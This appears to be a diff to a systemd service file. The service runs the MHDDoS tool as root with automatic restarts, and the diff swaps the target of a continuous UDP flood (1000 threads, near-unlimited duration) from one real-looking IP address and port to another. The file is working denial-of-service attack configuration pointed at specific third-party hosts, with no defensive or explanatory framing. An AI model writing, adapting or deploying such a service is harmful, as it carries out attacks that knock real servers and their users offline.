@@ -32,7 +32,7 @@ User=root
 WorkingDirectory=/root/MHDDoS
 # Ensure the local directory is prioritized for modules
 Environment=PYTHONPATH=/root/MHDDoS
-ExecStart=/usr/bin/python3 start.py UDP 162.19.126.179:7777 1000 99999999999
+ExecStart=/usr/bin/python3 start.py UDP 40.160.20.9:16261 1000 99999999999
 Restart=always
 RestartSec=5s
 RuntimeMaxSec=10min
